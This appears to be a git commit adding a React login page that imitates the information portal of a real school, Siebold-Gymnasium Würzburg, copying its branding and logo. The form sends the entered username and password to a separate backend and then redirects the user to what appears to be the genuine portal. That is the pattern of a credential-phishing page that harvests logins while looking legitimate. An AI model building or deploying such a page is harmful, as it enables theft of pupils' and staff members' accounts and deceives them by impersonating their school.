3d2e5697c326edd2cf2d2cd281812383ea3ae191
HansGeorgBinsteiner25 <mustermann.max@edv.to>
2025-11-13 22:55:17 +0100

    Initial Commit

---
+++ src/App.jsx
@@ -0,0 +1,27 @@
+import logo from "./assets/logo.png";
+import certification from "./assets/certification.png"
+import "./style.css";
+import LoginForm from "./components/Login";
+
+function App(){
+  return(
+    <center>
+      <h1></h1>
+      <p>
+        <span className="medium-text">Informationsportal</span>
+        <br />
+        <span className="big-text">Siebold-Gymnasium Würzburg</span>
+      </p>
+      <br />
+      <img src={logo} alt="Schullogo" className="logo"/>
+      <p className="small-text">
+        <br />
+        Version 2025.11.11.161671
+      </p>
+      <LoginForm />
+      <img className="certification" src={certification} alt="Zertifikat" />
+    </center>
+  )
+}
+
+export default App
---
+++ src/components/Login.jsx
@@ -0,0 +1,63 @@
+import React, { useState } from "react";
+import "./Login.css";
+
+function LoginForm() {
+  const [showPassword, setShowPassword] = useState(false);
+  const [user, setUser] = useState("")
+  const [password, setPassword] = useState("")
+
+  const togglePassword = () => {
+    setShowPassword((prev) => !prev);
+  };
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    const response = await fetch("http://localhost:5000/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ user, password })
+    })
+
+    const data = await response.json();
+    alert(data.message)
+    window.location.href='https://schule-infoportal.de/login/siewuegym';
+  }
+
+  return (
+    <form id="login-form" onSubmit={handleSubmit}>
+      <div className="field">
+        <label htmlFor="user">Benutzer</label>
+        <input 
+        type="text" 
+        id="user" 
+        name="user" 
+        value={user} 
+        onChange={(e) => setUser(e.target.value)}
+        />
+      </div>
+
+      <div className="field">
+        <label htmlFor="password">
+          Passwort
+          <span className="eye" onClick={togglePassword}>
+            👁
+          </span>
+        </label>
+        <input
+          type={showPassword ? "text" : "password"}
+          id="password"
+          name="password"
+          value={password}
+          onChange={(e) => setPassword(e.target.value)}
+        />
+      </div>
+
+      <div className="buttons">
+        <button type="button" id="close_button">Beenden</button>
+        <button type="submit">Anmelden</button>
+      </div>
+    </form>
+  );
+}
+
+export default LoginForm;
